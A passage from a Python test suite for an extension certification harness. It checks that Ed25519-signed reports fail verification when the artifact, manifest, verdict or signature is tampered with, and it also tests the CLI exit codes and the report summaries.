            key.public_key().public_bytes_raw().hex(),
        )

    def test_a_signed_report_verifies_against_the_publisher_key(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        keypair: tuple[str, str],
    ) -> None:
        private_hex, public_hex = keypair
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, signing_key_hex=private_hex))
        assert report.certified
        assert report.signature["signed"] is True
        assert report.signature["algorithm"] == "ed25519"
        assert report.signature["public_key"] == public_hex
        out = tmp_path / "signed.json"
        report.write_json(out)
        result = verify_certification(out, wheel, publisher_key_hex=public_hex)
        assert result.ok, result.failures

    def test_verifying_without_a_pinned_key_reports_self_consistency(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        keypair: tuple[str, str],
    ) -> None:
        private_hex, _ = keypair
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, signing_key_hex=private_hex))
        out = tmp_path / "signed.json"
        report.write_json(out)
        result = verify_certification(out, wheel)
        assert result.ok, result.failures
        assert any("self-consistency" in item for item in result.checked)

    def test_unsigned_report_with_a_pinned_key_fails(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        keypair: tuple[str, str],
    ) -> None:
        _, public_hex = keypair
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        out = tmp_path / "unsigned.json"
        report.write_json(out)
        result = verify_certification(out, wheel, publisher_key_hex=public_hex)
        assert not result.ok
        assert any("unsigned" in failure for failure in result.failures)

    def test_malformed_signing_key_fails_closed_but_truthfully(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, signing_key_hex="not-hex"))
        assert report.signature["signed"] is False
        assert "signing failed" in report.signature["reason"]
        # The report is still a complete, honest document about a declined
        # signature — and the certification itself still succeeded on its checks.
        assert report.certified

    def test_tampered_artifact_fails_verification(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        keypair: tuple[str, str],
    ) -> None:
        private_hex, public_hex = keypair
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, signing_key_hex=private_hex))
        out = tmp_path / "signed.json"
        report.write_json(out)
        mutated = tmp_path / "mutated.whl"
        data = bytearray(wheel.read_bytes())
        data[-1] ^= 0xFF
        mutated.write_bytes(bytes(data))
        result = verify_certification(out, mutated, publisher_key_hex=public_hex)
        assert not result.ok
        assert any("bytes changed" in failure for failure in result.failures)

    def test_swapped_manifest_inside_the_artifact_fails_verification(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        valid_manifest: dict,
    ) -> None:
        root = make_extension()
        _write_pyproject(root)
        manifest = json.loads((root / "extension.json").read_text(encoding="utf-8"))
        wheel = _make_wheel(tmp_path, manifest, source_root=root)
        report = certify(_request(root, wheel))
        out = tmp_path / "cert.json"
        report.write_json(out)
        # An attacker swaps the shipped manifest for a different one and
        # re-records the artifact digest so the byte-digest check passes; the
        # manifest binding must still refuse the swap.
        swapped = _make_wheel(
            tmp_path,
            manifest,
            manifest_override={**valid_manifest, "title": "A different title"},
            name="swapped",
        )
        document = json.loads(out.read_text(encoding="utf-8"))
        import hashlib

        document["artifact"]["sha256"] = hashlib.sha256(swapped.read_bytes()).hexdigest()
        out.write_text(json.dumps(document), encoding="utf-8")
        result = verify_certification(out, swapped)
        assert not result.ok
        assert any(
            "manifest changed" in failure or "manifest_sha256" in failure
            for failure in result.failures
        ), result.failures

    def test_relabeled_artifact_with_stale_signature_fails_verification(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        valid_manifest: dict,
        keypair: tuple[str, str],
    ) -> None:
        private_hex, public_hex = keypair
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, signing_key_hex=private_hex))
        out = tmp_path / "signed.json"
        report.write_json(out)
        # An intermediary ships a different wheel, re-records the artifact
        # digests and subject to match it, and keeps the original signed
        # payload: the signature must not verify for the replacement.
        replacement = _make_wheel(
            tmp_path,
            valid_manifest,
            manifest_override={**valid_manifest, "title": "An impostor"},
            name="impostor",
        )
        document = json.loads(out.read_text(encoding="utf-8"))
        import hashlib

        document["artifact"]["sha256"] = hashlib.sha256(replacement.read_bytes()).hexdigest()
        document["artifact"]["manifest_sha256"] = hashlib.sha256(
            json.dumps({**valid_manifest, "title": "An impostor"}, indent=2).encode()
        ).hexdigest()
        document["subject"]["title"] = "An impostor"
        out.write_text(json.dumps(document), encoding="utf-8")
        result = verify_certification(out, replacement, publisher_key_hex=public_hex)
        assert not result.ok
        assert any(
            "does not cover the supplied artifact" in failure for failure in result.failures
        ), result.failures

    def test_a_corrupt_report_is_unreadable_not_verified(
        self, tmp_path: Path, keypair: tuple[str, str]
    ) -> None:
        _, public_hex = keypair
        bad = tmp_path / "bad.json"
        bad.write_text("{not json", encoding="utf-8")
        result = verify_certification(bad, tmp_path / "whatever.whl", publisher_key_hex=public_hex)
        assert not result.ok
        assert any("unreadable" in failure for failure in result.failures)

    def test_certified_true_with_decline_reasons_is_corrupt(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        keypair: tuple[str, str],
    ) -> None:
        _, public_hex = keypair
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        out = tmp_path / "cert.json"
        report.write_json(out)
        document = json.loads(out.read_text(encoding="utf-8"))
        document["decision"]["decline_reasons"] = ["injected inconsistency"]
        out.write_text(json.dumps(document), encoding="utf-8")
        result = verify_certification(out, wheel, publisher_key_hex=public_hex)
        assert not result.ok
        assert any("corrupt" in failure for failure in result.failures)

    @pytest.mark.parametrize(
        ("field", "value"),
        [
            ("decision", []),
            ("signature", ["not", "an", "object"]),
            ("subject", 42),
        ],
        ids=["decision-list", "signature-list", "subject-int"],
    )
    def test_a_malformed_report_container_fails_without_raising(
        self, tmp_path: Path, field: str, value: object
    ) -> None:
        """Reports are untrusted verifier input: a wrong container type must
        become a verification failure, not an AttributeError escaping the
        API (PR #2089 review, P2)."""
        out = tmp_path / "malformed.json"
        document: dict[str, object] = {
            "certification_schema": "maistro-ext-harness/certification@1",
            "decision": {"certified": True, "decline_reasons": []},
            "artifact": {"sha256": "0" * 64, "manifest_sha256": "", "top_package": "x"},
            "signature": {"signed": True},
            "subject": {"id": "x", "version": "1.0.0"},
        }
        document[field] = value
        out.write_text(json.dumps(document), encoding="utf-8")
        result = verify_certification(out, tmp_path / "missing.whl")
        assert not result.ok
        assert any(
            "not an object" in failure or "not objects" in failure for failure in result.failures
        ), result.failures

    def test_an_unsupported_schema_version_fails_verification(self, tmp_path: Path) -> None:
        """The verifier implements exactly one report shape; a ``@2`` (or
        ``@garbage``) prefix must not be interpreted with today's semantics
        (PR #2089 review, P2)."""
        for schema in (
            "maistro-ext-harness/certification@2",
            "maistro-ext-harness/certification@garbage",
        ):
            out = tmp_path / "future.json"
            out.write_text(
                json.dumps(
                    {
                        "certification_schema": schema,
                        "decision": {"certified": True, "decline_reasons": []},
                        "artifact": {"sha256": "0" * 64},
                    }
                ),
                encoding="utf-8",
            )
            result = verify_certification(out, tmp_path / "missing.whl")
            assert not result.ok
            assert any(
                "unsupported certification schema" in failure for failure in result.failures
            ), (schema, result.failures)

    def test_a_foreign_signature_does_not_verify(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        keypair: tuple[str, str],
    ) -> None:
        signer = Ed25519PrivateKey.generate()
        other = Ed25519PrivateKey.generate()
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(
            _request(
                root,
                wheel,
                signing_key_hex=signer.private_bytes_raw().hex(),
            )
        )
        out = tmp_path / "signed.json"
        report.write_json(out)
        result = verify_certification(
            out, wheel, publisher_key_hex=other.public_key().public_bytes_raw().hex()
        )
        assert not result.ok
        assert any("does not verify" in failure for failure in result.failures)

    def test_the_signed_verdict_is_authenticated(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        keypair: tuple[str, str],
    ) -> None:
        """The Codex P1, live at head eb10bb7c: a signed DECLINED report
        (a forbidden-import decline) flipped to ``certified=True``, its
        reasons cleared, its failed checks whitewashed — with the signature
        block byte-identical — verified ``ok=True`` against the pinned
        publisher key, because the signature covered only identity and
        digests. The signature now covers the report's complete evidence,
        so every one of those edits must fail verification."""
        private_hex, public_hex = keypair
        root, wheel = _certifiable(make_extension, tmp_path)
        (_pkg(root) / "sneaky.py").write_text("import maistro_server.routes\n", encoding="utf-8")
        report = certify(_request(root, wheel, signing_key_hex=private_hex))
        assert not report.certified  # a genuinely declined, genuinely signed report
        out = tmp_path / "declined.json"
        report.write_json(out)
        original = json.loads(out.read_text(encoding="utf-8"))

        def flip_verdict(document: dict) -> None:
            document["decision"]["certified"] = True

        def clear_reasons(document: dict) -> None:
            flip_verdict(document)
            document["decision"]["decline_reasons"] = []

        def whitewash_checks(document: dict) -> None:
            for check in document["checks"]:
                if check["status"] == "failed":
                    check["status"] = "passed"

        def inject_claim(document: dict) -> None:
            document["decision"]["claims"].append("forged: nothing executed this")

        def forge_conformance(document: dict) -> None:
            document["conformance"]["executed"] = False
            document["conformance"]["reason"] = "forged"

        for tamper in (
            flip_verdict,
            clear_reasons,
            whitewash_checks,
            inject_claim,
            forge_conformance,
        ):
            document = json.loads(out.read_text(encoding="utf-8"))
            tamper(document)
            assert document["signature"] == original["signature"], tamper.__name__
            tampered = tmp_path / "tampered.json"
            tampered.write_text(json.dumps(document, indent=2) + "\n", encoding="utf-8")
            result = verify_certification(tampered, wheel, publisher_key_hex=public_hex)
            assert not result.ok, tamper.__name__
            assert any(
                "report content changed since signing" in failure for failure in result.failures
            ), (tamper.__name__, result.failures)

    def test_a_forged_evidence_digest_does_not_authenticate_a_tampered_report(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        keypair: tuple[str, str],
    ) -> None:
        """The recorded evidence digest is not secret: an attacker who edits
        the verdict can recompute it over the tampered content. The Ed25519
        signature over the changed bytes is what refuses them."""
        private_hex, public_hex = keypair
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, signing_key_hex=private_hex))
        assert report.certified
        out = tmp_path / "signed.json"
        report.write_json(out)
        document = json.loads(out.read_text(encoding="utf-8"))
        document["decision"]["certified"] = False
        document["decision"]["decline_reasons"] = ["forged decline"]
        # imported lazily so the other new tests can demonstrate their own
        # failures against a pre-evidence-signing implementation
        from maistro_ext_harness.signing import canonical_evidence_payload

        document["signature"]["evidence_sha256"] = hashlib.sha256(
            canonical_evidence_payload(document)
        ).hexdigest()
        tampered = tmp_path / "tampered.json"
        tampered.write_text(json.dumps(document, indent=2) + "\n", encoding="utf-8")
        result = verify_certification(tampered, wheel, publisher_key_hex=public_hex)
        assert not result.ok
        assert any("does not verify" in failure for failure in result.failures), result.failures

    def test_a_signature_without_an_evidence_digest_is_rejected(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        keypair: tuple[str, str],
    ) -> None:
        """A signature stripped of its evidence digest (and every
        pre-evidence signature from an older harness) authenticates nothing
        about the verdict and is refused by name."""
        private_hex, public_hex = keypair
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, signing_key_hex=private_hex))
        out = tmp_path / "signed.json"
        report.write_json(out)
        document = json.loads(out.read_text(encoding="utf-8"))
        del document["signature"]["evidence_sha256"]
        stripped = tmp_path / "stripped.json"
        stripped.write_text(json.dumps(document, indent=2) + "\n", encoding="utf-8")
        result = verify_certification(stripped, wheel, publisher_key_hex=public_hex)
        assert not result.ok
        assert any("no evidence digest" in failure for failure in result.failures), result.failures

    def test_verification_without_the_signing_backend_names_the_fix(
        self,
        make_extension: Callable[..., Path],
        tmp_path: Path,
        keypair: tuple[str, str],
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Codex P2: a default harness install has no ``cryptography``
        package; that is an unavailable backend — not a "signature does not
        verify" answer for a signature nobody could check."""
        private_hex, public_hex = keypair
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, signing_key_hex=private_hex))
        out = tmp_path / "signed.json"
        report.write_json(out)

        from maistro_ext_harness import signing

        def unavailable() -> tuple[type, type]:
            raise signing.SigningUnavailable(
                "signing requires the 'cryptography' package; install it with: "
                "pip install 'maistro-ext-harness[signing]'"
            )

        monkeypatch.setattr(signing, "_require_cryptography", unavailable)
        result = verify_certification(out, wheel, publisher_key_hex=public_hex)
        assert not result.ok
        assert any(
            "could not be checked" in failure and "[signing]" in failure
            for failure in result.failures
        ), result.failures


class TestPolicySync:
    def test_embedded_roots_equal_the_repository_namespace_policy(self) -> None:
        """The certification tool a third party runs embeds the boundary; the
        embedded statement and the repository's policy file must stay the
        same statement."""
        policy = json.loads(NAMESPACE_POLICY.read_text(encoding="utf-8"))
        assert frozenset(policy["public_sdk_namespaces"]) == PUBLIC_SDK_ROOTS
        assert frozenset(policy["product_private_namespaces"]) == PRODUCT_PRIVATE_ROOTS
        assert {"packages", "extensions"} == REPO_RELATIVE_ROOTS


class TestCli:
    def _cli(self, *args: str) -> subprocess.CompletedProcess[str]:
        return subprocess.run(
            [sys.executable, "-m", "maistro_ext_harness", *args],
            capture_output=True,
            text=True,
            check=False,
            cwd=str(Path(__file__).parent),
        )

    def test_certify_happy_path_exit_0_and_report_written(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        out = tmp_path / "cert.json"
        proc = self._cli(
            "certify",
            "--path",
            str(root),
            "--artifact",
            str(wheel),
            "--report",
            str(out),
        )
        assert proc.returncode == 0, proc.stderr
        assert "CERTIFIED" in proc.stdout
        document = json.loads(out.read_text(encoding="utf-8"))
        assert document["decision"]["certified"] is True

    def test_certify_declined_exit_1_and_names_the_reason(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        (_pkg(root) / "sneaky.py").write_text("import maistro_server.routes\n", encoding="utf-8")
        proc = self._cli("certify", "--path", str(root), "--artifact", str(wheel))
        assert proc.returncode == 1
        assert "DECLINED" in proc.stdout
        assert "security/imports-public-only" in proc.stdout

    def test_certify_missing_artifact_still_declines_truthfully(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root = make_extension()
        _write_pyproject(root)
        proc = self._cli("certify", "--path", str(root), "--artifact", str(tmp_path / "absent.whl"))
        assert proc.returncode == 1
        assert "DECLINED" in proc.stdout

    def test_certify_signing_key_file_round_trip_and_verify(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        key = Ed25519PrivateKey.generate()
        key_file = tmp_path / "signing-key.hex"
        key_file.write_text(key.private_bytes_raw().hex(), encoding="utf-8")
        publisher_key = key.public_key().public_bytes_raw().hex()
        root, wheel = _certifiable(make_extension, tmp_path)
        out = tmp_path / "cert.json"
        proc = self._cli(
            "certify",
            "--path",
            str(root),
            "--artifact",
            str(wheel),
            "--signing-key-file",
            str(key_file),
            "--report",
            str(out),
        )
        assert proc.returncode == 0, proc.stderr
        document = json.loads(out.read_text(encoding="utf-8"))
        assert document["signature"]["signed"] is True

        verify = self._cli(
            "verify-certification",
            "--report",
            str(out),
            "--artifact",
            str(wheel),
            "--publisher-key",
            publisher_key,
        )
        assert verify.returncode == 0, verify.stderr
        assert "verified" in verify.stdout

    def test_verify_fails_on_a_mutated_artifact(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        out = tmp_path / "cert.json"
        self._cli("certify", "--path", str(root), "--artifact", str(wheel), "--report", str(out))
        mutated = tmp_path / "mutated.whl"
        mutated.write_bytes(wheel.read_bytes() + b"trailing")
        proc = self._cli("verify-certification", "--report", str(out), "--artifact", str(mutated))
        assert proc.returncode == 1
        assert "bytes changed" in proc.stderr

    def test_verify_unknown_schema_exit_1(self, tmp_path: Path) -> None:
        report = tmp_path / "cert.json"
        report.write_text(json.dumps({"certification_schema": "someone-else/v9"}), encoding="utf-8")
        wheel = tmp_path / "w.whl"
        wheel.write_bytes(b"nope")
        proc = self._cli("verify-certification", "--report", str(report), "--artifact", str(wheel))
        assert proc.returncode == 1
        assert "unsupported certification schema" in proc.stderr

    def test_certify_missing_signing_key_file_exits_2(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """Codex P2: an unreadable --signing-key-file used to escape the CLI
        as a traceback; it is a bad argument — exit 2 with an actionable
        message and no report."""
        root, wheel = _certifiable(make_extension, tmp_path)
        proc = self._cli(
            "certify",
            "--path",
            str(root),
            "--artifact",
            str(wheel),
            "--signing-key-file",
            str(tmp_path / "missing.hex"),
        )
        assert proc.returncode == 2
        assert "cannot read --signing-key-file" in proc.stderr
        assert "Traceback" not in proc.stderr


# ------------------------------------------------------------ report rendering
#
# `human_summary` is the CI-log face of the certification: every branch of it
# must name the state it is in, including the unhappy ones a green run never
# produces (a missing artifact, a failed/skipped/not-applicable check, a
# conformance stage that never executed).


def _summary_report(**overrides: object) -> CertificationReport:
    """A minimal report for summary rendering; tests mutate what they pin."""
    fields: dict[str, object] = {
        "schema": CERTIFICATION_SCHEMA,
        "profile": CertificationProfile.STANDARD.value,
        "harness_version": "test",
        "contract_version": "1.0.0",
        "supported_contract_majors": (1,),
        "sdk_package_version": None,
        "environment": {},
        "subject": {"id": "acme.widget", "version": "1.0.0", "family": "tool"},
        "artifact": {"filename": "acme-widget-1.0.0-py3-none-any.whl", "sha256": "ab" * 32},
    }
    fields.update(overrides)
    return CertificationReport(**fields)  # type: ignore[arg-type]


class TestHumanSummary:
    def test_an_unsigned_certified_report_names_its_state(
        self, capsys: pytest.CaptureFixture[str]
    ) -> None:
        report = _summary_report(certified=True, claims=["a check: did the thing"])
        summary = report.human_summary()
        assert "CERTIFIED (profile standard)" in summary
        assert "acme.widget 1.0.0 (tool, contract None)" in summary
        assert "acme-widget-1.0.0-py3-none-any.whl sha256:abababababababab" in summary
        assert "unsigned (no key supplied)" in summary
        assert "1 proven" in summary

    def test_a_signed_declined_report_renders_every_failure_face(
        self, capsys: pytest.CaptureFixture[str]
    ) -> None:
        from maistro_ext_harness.checks import CheckRecord

        report = _summary_report(
            certified=False,
            decline_reasons=["check x/y failed: no"],
            not_proven=["platform certification: " + "x"],
            claims=[],
            checks=[
                CheckRecord(
                    check_id="x/y",
                    description="a check",
                    status=CheckStatus.FAILED,
                    detail="no",
                ),
                CheckRecord(
                    check_id="z/w",
                    description="a skipped check",
                    status=CheckStatus.SKIPPED,
                    detail="backend absent",
                ),
                CheckRecord(
                    check_id="n/a",
                    description="not applicable here",
                    status=CheckStatus.NOT_APPLICABLE,
                    detail="family has no such case",
                ),
            ],
            conformance_executed=False,
            conformance_reason="manifest did not validate",
            signature={"signed": True, "public_key": "cd" * 32},
        )
        summary = report.human_summary()
        assert "DECLINED" in summary
        assert "ed25519, public key cdcdcdcdcdcdcdcd" in summary
        assert "DECLINE: check x/y failed: no" in summary
        assert "FAIL x/y: no" in summary
        assert "SKIPPED z/w: backend absent" in summary
        assert "NOT-APPLICABLE n/a: family has no such case" in summary
        assert "conformance did NOT execute: manifest did not validate" in summary

    def test_a_report_without_an_artifact_says_so(self) -> None:
        report = _summary_report(artifact=None, certified=False, decline_reasons=["no artifact"])
        summary = report.human_summary()
        assert "artifact:  n/a" in summary


class TestVerdictsFromChecks:
    """`_verdicts_from_checks` is the honesty hinge: each status x profile
    combination must land in exactly one of claim / decline / not-proven."""

    @staticmethod
    def _pipeline(checks: list[object], profile: CertificationProfile) -> object:
        from maistro_ext_harness.certification import _Pipeline

        return _Pipeline(
            request=types.SimpleNamespace(  # type: ignore[arg-type]
                profile=profile, subject=None, artifact=None
            ),
            checks=checks,
        )

    @pytest.mark.parametrize(
        ("status", "profile", "required"),
        [
            (CheckStatus.PASSED, CertificationProfile.STANDARD, False),
            (CheckStatus.FAILED, CertificationProfile.STANDARD, False),
            (CheckStatus.FAILED, CertificationProfile.STRICT, False),
            (CheckStatus.SKIPPED, CertificationProfile.STANDARD, False),
            (CheckStatus.SKIPPED, CertificationProfile.STANDARD, True),
            (CheckStatus.SKIPPED, CertificationProfile.STRICT, False),
            (CheckStatus.NOT_APPLICABLE, CertificationProfile.STANDARD, False),
            (CheckStatus.NOT_APPLICABLE, CertificationProfile.STRICT, False),
        ],
        ids=[
            "passed-claims",
            "failed-declines",
            "failed-strict-declines",
            "skip-lenient-not-proven",
            "skip-required-declines",
            "skip-strict-declines",
            "na-lenient-not-proven",
            "na-strict-declines",
        ],
    )
    def test_each_status_lands_in_its_bucket(
        self,
        status: CheckStatus,
        profile: CertificationProfile,
        required: bool,
    ) -> None:
        from maistro_ext_harness.certification import _Pipeline
        from maistro_ext_harness.checks import CheckRecord

        record = CheckRecord(
            check_id="bucket/test",
            description="a bucket check",
            status=status,
            detail="because",
            required=required,
        )
        pipeline = self._pipeline([record], profile)
        _verdicts_from_checks(pipeline)  # type: ignore[arg-type]
        assert pipeline is not None and isinstance(pipeline, _Pipeline)
        if status is CheckStatus.PASSED:
            assert pipeline.claims and not pipeline.decline_reasons
        elif status is CheckStatus.FAILED:
            assert pipeline.decline_reasons and "failed" in pipeline.decline_reasons[0]
        elif status is CheckStatus.SKIPPED and (profile.declines_skips or required):
            assert pipeline.decline_reasons and "did not execute" in pipeline.decline_reasons[0]
        elif status is CheckStatus.SKIPPED:
            assert pipeline.not_proven and not pipeline.decline_reasons
        elif profile.declines_skips:
            assert pipeline.decline_reasons and "not applicable" in pipeline.decline_reasons[0]
        else:
            assert pipeline.not_proven and not pipeline.decline_reasons


class TestSigningStageHonesty:
    def test_certifying_without_a_key_says_the_report_is_unsigned(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        assert report.certified
        assert report.signature == {
            "signed": False,
            "reason": "no signing key supplied; the report is unsigned",
        }

    def test_signing_with_an_unreadable_artifact_leaves_the_report_unsigned(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """The digests the signature would cover never came into existence
        (the artifact did not validate), so nothing is signed — and the
        reason says that, rather than implying a signature exists."""
        root, _wheel = _certifiable(make_extension, tmp_path)
        not_a_zip = tmp_path / "acme-widget-1.0.0-py3-none-any.whl"
        not_a_zip.write_bytes(b"this is not a zip file")
        report = certify(_request(root, not_a_zip, signing_key_hex="11" * 32))
        assert not report.certified
        assert report.signature["signed"] is False
        assert "digests are unavailable" in report.signature["reason"]


class TestVerifierEarlyRejections:
    """Malformed reports are verification failures with named reasons —
    the arms a well-formed signed report never reaches."""

    def _report_file(self, tmp_path: Path, document: object) -> Path:
        path = tmp_path / "report.json"
        path.write_text(json.dumps(document), encoding="utf-8")
        return path

    def test_a_report_that_is_not_an_object_fails(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        _root, wheel = _certifiable(make_extension, tmp_path)
        result = verify_certification(self._report_file(tmp_path, ["not", "an", "object"]), wheel)
        assert not result.ok
        assert "report is not a JSON object" in result.failures

    def test_a_report_without_an_artifact_digest_binds_nothing(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        _root, wheel = _certifiable(make_extension, tmp_path)
        result = verify_certification(
            self._report_file(tmp_path, {"certification_schema": CERTIFICATION_SCHEMA}), wheel
        )
        assert not result.ok
        assert "records no artifact digest" in result.failures[0]

    def test_an_artifact_that_is_no_longer_a_zip_is_named(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        out = tmp_path / "report.json"
        report.write_json(out)
        garbage = tmp_path / "garbage.whl"
        garbage.write_bytes(b"definitely not a zip")
        result = verify_certification(out, garbage)
        assert not result.ok
        assert any("no longer ships the discovery manifest" in f for f in result.failures), (
            result.failures
        )

    def test_a_vanished_artifact_is_named_as_unreadable(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        out = tmp_path / "report.json"
        report.write_json(out)
        result = verify_certification(out, tmp_path / "gone.whl")
        assert not result.ok
        assert any("no longer a zip archive" in f for f in result.failures), result.failures

    def test_a_zip_without_the_manifest_member_is_named(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        out = tmp_path / "report.json"
        report.write_json(out)
        manifest_less = tmp_path / "manifest-less.whl"
        with zipfile.ZipFile(manifest_less, "w") as archive:
            archive.writestr("only/one/member.txt", "no extension.json anywhere")
        result = verify_certification(out, manifest_less)
        assert not result.ok
        assert any("no longer ships the discovery manifest" in f for f in result.failures), (
            result.failures
        )

    def test_a_decision_that_is_not_an_object_fails(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel))
        document = report.to_dict()
        document["decision"] = ["not", "an", "object"]
        out = self._report_file(tmp_path, document)
        result = verify_certification(out, wheel)
        assert not result.ok
        assert any("decision is not an object" in f for f in result.failures), result.failures

    def test_a_payload_digest_that_does_not_rederive_fails(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        """The signed identity payload must re-derive from the report's own
        subject/artifact records; a digest over anything else is corrupt."""
        key = Ed25519PrivateKey.generate()
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, signing_key_hex=key.private_bytes_raw().hex()))
        document = report.to_dict()
        document["signature"]["payload_sha256"] = "00" * 32
        out = self._report_file(tmp_path, document)
        result = verify_certification(
            out, wheel, publisher_key_hex=key.public_key().public_bytes_raw().hex()
        )
        assert not result.ok
        assert any("does not re-derive" in f for f in result.failures), result.failures

    def test_a_signed_report_whose_subject_record_is_not_an_object_fails(
        self, make_extension: Callable[..., Path], tmp_path: Path
    ) -> None:
        key = Ed25519PrivateKey.generate()
        root, wheel = _certifiable(make_extension, tmp_path)
        report = certify(_request(root, wheel, signing_key_hex=key.private_bytes_raw().hex()))
        document = report.to_dict()
        document["subject"] = "not an object"
        out = self._report_file(tmp_path, document)
        result = verify_certification(out, wheel)
        assert not result.ok
        assert any("subject/artifact records are not objects" in f for f in result.failures), (
            result.failures
        )
